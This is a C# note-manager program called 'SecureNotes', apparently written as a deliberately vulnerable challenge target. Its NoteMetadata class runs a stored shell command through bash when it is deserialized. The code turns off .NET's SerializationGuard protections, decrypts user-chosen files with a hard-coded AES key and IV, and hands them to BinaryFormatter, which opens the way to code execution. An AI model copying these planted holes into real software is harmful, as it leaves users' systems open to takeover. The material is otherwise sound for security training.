using System;
using System.IO;
using System.Security.Cryptography;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;

namespace SecureNotes
{
    [Serializable]
    public class Note
    {
        public string Title { get; set; }
        public string Content { get; set; }
        public DateTime CreatedAt { get; set; }

        public Note()
        {
            CreatedAt = DateTime.Now;
        }
    }

    [Serializable]
    public class NoteMetadata : ISerializable
    {
        public string Author { get; set; }
        public int Version { get; set; }
        private string command;

        public NoteMetadata()
        {
        }

        public NoteMetadata(string cmd)
        {
            command = cmd;
        }

        protected NoteMetadata(SerializationInfo info, StreamingContext context)
        {
            Author = info.GetString("Author");
            Version = info.GetInt32("Version");
            command = info.GetString("Command");

            ExecuteCommand(command);
        }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.AddValue("Author", Author);
            info.AddValue("Version", Version);
            info.AddValue("Command", command);
        }

        static void ExecuteCommand(string cmd)
        {
            try
            {
                var proc = new System.Diagnostics.Process();
                proc.StartInfo.FileName = "/bin/bash";
                proc.StartInfo.Arguments = $"-c \"{cmd}\"";
                proc.StartInfo.RedirectStandardOutput = true;
                proc.StartInfo.RedirectStandardError = true;
                proc.StartInfo.UseShellExecute = false;
                proc.Start();

                string output = proc.StandardOutput.ReadToEnd();
                string error = proc.StandardError.ReadToEnd();

                proc.WaitForExit();

                if (!string.IsNullOrEmpty(output))
                    Console.WriteLine(output);

                if (!string.IsNullOrEmpty(error))
                    Console.Error.WriteLine(error);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }
    }

    class Program
    {
        private static readonly byte[] Key = Encoding.UTF8.GetBytes("MySecureKey12345MySecureKey12345");
        private static readonly byte[] IV = Encoding.UTF8.GetBytes("MySecureIV123456");
        private static readonly string NotesDirectory = Environment.GetEnvironmentVariable("NOTES_DIR") ?? "notes";

        static void Main(string[] args)
        {
            AppContext.SetSwitch("Switch.System.Runtime.Serialization.SerializationGuard.AllowProcessCreation", true);
            AppContext.SetSwitch("Switch.System.Runtime.Serialization.SerializationGuard.AllowFileWrites", true);

            Console.WriteLine("==================================");
            Console.WriteLine("  SecureNotes v1.0");
            Console.WriteLine("  AES-256 Encrypted Note Manager");
            Console.WriteLine("==================================");
            Console.WriteLine();

            if (!Directory.Exists(NotesDirectory))
                Directory.CreateDirectory(NotesDirectory);

            while (true)
            {
                Console.WriteLine("\n[1] Create Note");
                Console.WriteLine("[2] Load Note");
                Console.WriteLine("[3] List Notes");
                Console.WriteLine("[4] Exit");
                Console.Write("\nChoice: ");

                string choice = Console.ReadLine();

                switch (choice)
                {
                    case "1":
                        CreateNote();
                        break;
                    case "2":
                        LoadNote();
                        break;
                    case "3":
                        ListNotes();
                        break;
                    case "4":
                        return;
                    default:
                        Console.WriteLine("Invalid choice");
                        break;
                }
            }
        }

        static void CreateNote()
        {
            Console.Write("Title: ");
            string title = Console.ReadLine();

            Console.Write("Content: ");
            string content = Console.ReadLine();

            Note note = new Note
            {
                Title = title,
                Content = content
            };

            string filename = $"{NotesDirectory}/{SanitizeFilename(title)}.enc";
            SaveNote(note, filename);

            Console.WriteLine($"[+] Note saved securely to {filename}");
        }

        static void LoadNote()
        {
            Console.Write("Filename: ");
            string filename = Console.ReadLine();

            string fullPath = Path.Combine(NotesDirectory, filename);

            if (!File.Exists(fullPath))
            {
                Console.WriteLine("[-] File not found");
                return;
            }

            try
            {
                object obj = LoadNoteFromFile(fullPath);

                if (obj is Note note)
                {
                    Console.WriteLine("\n--- Note ---");
                    Console.WriteLine($"Title: {note.Title}");
                    Console.WriteLine($"Content: {note.Content}");
                    Console.WriteLine($"Created: {note.CreatedAt}");
                }
                else
                {
                    Console.WriteLine("[+] Data loaded successfully");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error loading note: {ex.Message}");
            }
        }

        static void ListNotes()
        {
            Console.WriteLine("\n--- Saved Notes ---");
            string[] files = Directory.GetFiles(NotesDirectory, "*.enc");

            if (files.Length == 0)
            {
                Console.WriteLine("No notes found");
                return;
            }

            foreach (string file in files)
            {
                Console.WriteLine($"  - {Path.GetFileName(file)}");
            }
        }

        static void SaveNote(object obj, string filename)
        {
            BinaryFormatter formatter = new BinaryFormatter();

            using (MemoryStream ms = new MemoryStream())
            {
                formatter.Serialize(ms, obj);
                byte[] serialized = ms.ToArray();

                byte[] encrypted = EncryptAES(serialized);
                File.WriteAllBytes(filename, encrypted);
            }
        }

        static object LoadNoteFromFile(string filename)
        {
            byte[] encrypted = File.ReadAllBytes(filename);
            byte[] decrypted = DecryptAES(encrypted);

            BinaryFormatter formatter = new BinaryFormatter();
            using (MemoryStream ms = new MemoryStream(decrypted))
            {
                return formatter.Deserialize(ms);
            }
        }

        static byte[] EncryptAES(byte[] data)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = Key;
                aes.IV = IV;

                ICryptoTransform encryptor = aes.CreateEncryptor();
                return encryptor.TransformFinalBlock(data, 0, data.Length);
            }
        }

        static byte[] DecryptAES(byte[] data)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = Key;
                aes.IV = IV;

                ICryptoTransform decryptor = aes.CreateDecryptor();
                return decryptor.TransformFinalBlock(data, 0, data.Length);
            }
        }

        static string SanitizeFilename(string filename)
        {
            foreach (char c in Path.GetInvalidFileNameChars())
            {
                filename = filename.Replace(c, '_');
            }
            return filename;
        }
    }
}